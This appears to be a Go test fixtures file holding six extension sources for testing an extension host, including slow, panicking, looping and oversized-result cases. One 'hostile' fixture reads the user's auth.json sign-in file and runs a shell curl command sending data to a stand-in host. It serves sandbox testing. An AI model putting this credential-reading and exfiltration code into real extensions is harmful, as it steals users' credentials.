package fixtures

// ExtensionFixture is a Go extension source file used to exercise the extension host. Each source is a
// `package main` file that declares Extension() for the host's nvm package, as the examples do.
type ExtensionFixture struct {
	// Name is a stable short name, used in test names and file names.
	Name string
	// Behavior states what the source does when its Search is called.
	Behavior string
	// Source is the file content.
	Source string
}

// ExtensionSources returns the six extension fixtures: a well-behaved one, a slow one, one that panics, one
// that never returns, one that returns a very large result set, and a hostile one that tries to run
// commands and read credentials. The hostile source is inert text here; it runs only in sandboxed tests.
func ExtensionSources() []ExtensionFixture {
	return []ExtensionFixture{
		{Name: "good", Behavior: "returns one result that echoes the query", Source: goodExtensionSource},
		{Name: "slow", Behavior: "blocks for ten seconds before returning", Source: slowExtensionSource},
		{Name: "panicking", Behavior: "panics on every search", Source: panickingExtensionSource},
		{Name: "infinite-loop", Behavior: "never returns from search", Source: infiniteLoopExtensionSource},
		{Name: "huge-results", Behavior: "returns one hundred thousand results", Source: hugeResultsExtensionSource},
		{Name: "hostile", Behavior: "tries to run a shell command and read the user's sign-in file", Source: hostileExtensionSource},
	}
}

const goodExtensionSource = `package main

import "nvm"

func Extension() nvm.Extension {
	return nvm.Extension{
		ID:    "fixture.good",
		Title: "Good",
		Search: func(q string) []nvm.Item {
			return []nvm.Item{{Title: "Good result for " + q, Value: q}}
		},
	}
}
`

const slowExtensionSource = `package main

import (
	"time"

	"nvm"
)

func Extension() nvm.Extension {
	return nvm.Extension{
		ID:    "fixture.slow",
		Title: "Slow",
		Search: func(q string) []nvm.Item {
			time.Sleep(10 * time.Second)
			return []nvm.Item{{Title: "Late result", Value: q}}
		},
	}
}
`

const panickingExtensionSource = `package main

import "nvm"

func Extension() nvm.Extension {
	return nvm.Extension{
		ID:    "fixture.panicking",
		Title: "Panicking",
		Search: func(q string) []nvm.Item {
			panic("fixture panic")
		},
	}
}
`

const infiniteLoopExtensionSource = `package main

import "nvm"

func Extension() nvm.Extension {
	return nvm.Extension{
		ID:    "fixture.infinite-loop",
		Title: "Infinite loop",
		Search: func(q string) []nvm.Item {
			for {
			}
		},
	}
}
`

const hugeResultsExtensionSource = `package main

import (
	"fmt"

	"nvm"
)

func Extension() nvm.Extension {
	return nvm.Extension{
		ID:    "fixture.huge-results",
		Title: "Huge results",
		Search: func(q string) []nvm.Item {
			items := make([]nvm.Item, 0, 100000)
			for i := 0; i < 100000; i++ {
				items = append(items, nvm.Item{Title: fmt.Sprintf("Result %d", i), Value: q})
			}
			return items
		},
	}
}
`

const hostileExtensionSource = `package main

import (
	"os"
	"os/exec"

	"nvm"
)

func Extension() nvm.Extension {
	return nvm.Extension{
		ID:    "fixture.hostile",
		Title: "Hostile",
		Search: func(q string) []nvm.Item {
			home, _ := os.UserHomeDir()
			data, _ := os.ReadFile(home + "/.config/nevermind/auth.json")
			_ = exec.Command("sh", "-c", "curl -s https://example.invalid/collect --data-binary @-").Run()
			return []nvm.Item{{Title: "Nothing to see", Value: string(data)}}
		},
	}
}
`
